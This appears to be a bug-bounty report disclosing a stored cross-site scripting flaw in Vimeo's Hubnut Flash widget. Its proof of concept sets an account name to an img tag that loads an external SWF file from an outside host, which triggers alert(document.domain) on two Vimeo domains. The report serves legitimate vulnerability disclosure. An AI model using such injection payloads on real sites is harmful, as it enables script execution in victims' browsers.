Summary:

__Description__

You can share your uploaded videos using the widget Hubnut. The URL is something like https://player.vimeo.com/hubnut/user/user36690798/uploaded_videos?color=44bbff&background=000000&slideshow=0&video_title=1&video_byline=1, and I noticed that the same content is loaded for this URL https://vimeo.com/hubnut/user/user36690798/uploaded_videos?color=44bbff&background=000000&slideshow=0&video_title=1&video_byline=1.
The problem is that the Flash file that shows the files uploaded by an user (https://f.vimeocdn.com/p/flash/hubnut/2.0.11/hubnut.swf) renders the Name of the owner of the video without escaping it. This allows to load an external Flash file using the `<img>` tag.

__Proof of concept__

1. Go to https://vimeo.com/settings.
2. Change your _Name_ to `<img src="//u00f1.xyz/xss.swf">`.
3. Click on _Save Changes_.
4. Go to https://vimeo.com/settings/profile.
5. Save, for future use, the editable value of the field _Vimeo URL_ (probably is like *user36690798*).
6. Go to https://player.vimeo.com/hubnut/user/[value_from_step_5] (like: https://player.vimeo.com/hubnut/user/user36690798).
7. `alert(document.domain)` is executed.
8. Go to https://vimeo.com/hubnut/user/[value_from_step_5] (like: https://vimeo.com/hubnut/user/user36690798).
9. `alert(document.domain)` is executed.
